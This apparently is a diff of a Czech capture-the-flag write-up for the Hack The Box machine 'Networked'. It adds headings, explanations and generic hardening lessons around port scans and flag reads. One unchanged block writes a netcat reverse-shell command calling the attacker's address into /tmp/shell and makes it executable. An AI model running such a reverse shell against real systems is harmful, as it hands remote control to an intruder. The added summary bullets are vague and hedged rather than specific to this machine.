@@ -5,11 +5,19 @@ title: "Networked"
 date: 2020-12-20
 tags: ssh sudo php exploit enumeration privesc
 ---
-[Networked](https://www.hackthebox.eu/home/machines/profile/203) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.
+
+## Úvod a kontext
+
+Networked je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -p 1-65535 -T4 -A -sC -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -p 1-65535 -T4 -A -sC -v $IP
+```
 ```
 PORT    STATE  SERVICE VERSION
 22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
@@ -27,8 +35,11 @@ ca
 ```
 
 ### Vyhledání otevřených portů (2)
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -sU -T4 -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -sU -T4 -v $IP
+```
 ```
 PORT      STATE         SERVICE
 684/udp   open|filtered corba-iiop-ssl
@@ -65,16 +76,24 @@ PORT      STATE         SERVICE
 61319/udp open|filtered unknown
 ```
 
+## Získání přístupu
+
 ### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`22 OpenSSH 7.4 (protocol 2.0)`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```text
+22 OpenSSH 7.4 (protocol 2.0)
+```
 ```
 - Ověřit enumeraci SSH uživatelů
 ```
 
 ### Získání user flagu
-Tímto potvrzuji úspěšný uživatelský přístup.
-`cat /home/guly/user.txt`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+cat /home/guly/user.txt
+```
 ```
 __CENSORED__
 netcat -lvp 4002
@@ -82,12 +101,33 @@ echo nc 10.10.15.13 4002 -c bash > /tmp/shell
 chmod +x /tmp/shell
 ```
 
+## Eskalace oprávnění
+
 ### Získání root flagu
-Tímto potvrzuji úplné ovládnutí stroje.
-`cat root.txt`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+cat root.txt
+```
 ```
 __CENSORED__
 ```
 
+## Analýza zjištění
+
 ### Přílohy
+
 ![Networked-shell.php.gif](/drafts/Networked/Networked-shell.php.gif)
+
+## Shrnutí klíčových poznatků
+
+- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.
+
+## Co si odnést do praxe
+
+- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
+- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
